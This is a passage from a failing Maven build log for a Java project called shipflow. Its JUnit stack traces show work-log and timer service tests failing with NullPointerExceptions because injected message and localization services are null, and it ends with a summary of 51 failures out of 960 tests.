	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85)
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47)
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122)
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385)
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162)
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495)

[ERROR]   WorkLogServiceTest.createWorkLog_WithBothPitchAndTask_ShouldThrowException:233 
Expecting actual throwable to be an instance of:
  java.lang.IllegalArgumentException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.WorkLogService.createWorkLog(WorkLogService.java:92)
	at com.github.farzadsedaghatbin.shipflow.service.WorkLogServiceTest.lambda$createWorkLog_WithBothPitchAndTask_ShouldThrowException$2(WorkLogServiceTest.java:232)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
[ERROR]   WorkLogServiceTest.createWorkLog_WithoutPitchOrTask_ShouldThrowException:219 
Expecting actual throwable to be an instance of:
  java.lang.IllegalArgumentException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.WorkLogService.createWorkLog(WorkLogService.java:92)
	at com.github.farzadsedaghatbin.shipflow.service.WorkLogServiceTest.lambda$createWorkLog_WithoutPitchOrTask_ShouldThrowException$1(WorkLogServiceTest.java:218)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
[ERROR]   WorkLogTimerServiceTest.shouldFailWhenActiveTimerExists:205 
Expecting actual throwable to be an instance of:
  com.github.farzadsedaghatbin.shipflow.exception.BadRequestException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String)" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.WorkLogTimerService.startTimer(WorkLogTimerService.java:46)
	at com.github.farzadsedaghatbin.shipflow.service.WorkLogTimerServiceTest.lambda$shouldFailWhenActiveTimerExists$2(WorkLogTimerServiceTest.java:204)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
[ERROR]   WorkLogTimerServiceTest.shouldFailWhenBothPitchAndTask:183 
Expecting actual throwable to be an instance of:
  com.github.farzadsedaghatbin.shipflow.exception.BadRequestException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String)" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.WorkLogTimerService.startTimer(WorkLogTimerService.java:40)
	at com.github.farzadsedaghatbin.shipflow.service.WorkLogTimerServiceTest.lambda$shouldFailWhenBothPitchAndTask$1(WorkLogTimerServiceTest.java:182)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
[ERROR]   WorkLogTimerServiceTest.shouldFailWhenNoPitchOrTask:168 
Expecting actual throwable to be an instance of:
  com.github.farzadsedaghatbin.shipflow.exception.BadRequestException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String)" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.WorkLogTimerService.startTimer(WorkLogTimerService.java:40)
	at com.github.farzadsedaghatbin.shipflow.service.WorkLogTimerServiceTest.lambda$shouldFailWhenNoPitchOrTask$0(WorkLogTimerServiceTest.java:167)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
[INFO] 
[ERROR] Tests run: 960, Failures: 51, Errors: 0, Skipped: 3
[INFO] 
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  41.706 s
[INFO] Finished at: 2026-01-17T23:26:55Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-surefire-plugin:3.1.2:test (default-test) on project shipflow: There are test failures.
[ERROR] 
[ERROR] Please refer to /Users/farzad/IdeaProjects/git/shapeup-tracker/backend/target/surefire-reports for the individual test results.
[ERROR] Please refer to dump files (if any exist) [date].dump, [date]-jvmRun[N].dump and [date].dumpstream.
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException
